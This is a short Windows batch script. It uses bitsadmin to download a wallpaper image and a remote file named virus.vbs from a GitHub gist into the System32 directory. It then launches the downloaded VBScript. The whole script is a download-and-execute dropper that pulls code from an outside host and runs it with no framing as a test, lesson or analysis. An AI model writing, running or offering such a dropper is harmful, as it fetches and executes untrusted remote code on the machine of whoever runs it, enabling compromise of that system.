@echo off

bitsadmin /transfer myDownloadJob /download /priority highest http://wallpapercave.com/wp/wp11484003.jpg %systemroot%\System32\wpll48003.jpg
bitsadmin /transfer githubgist /download /priority highest https://gist.githubusercontent.com/INeddHelp/58772972accfa837a75b226dac23e88b/raw/6c9324badfd28849276abc16270244ac5eba40ad/virus.vbs %systemroot%\System32\virus.vbs
cd %systemroot%\System32
start virus.vbs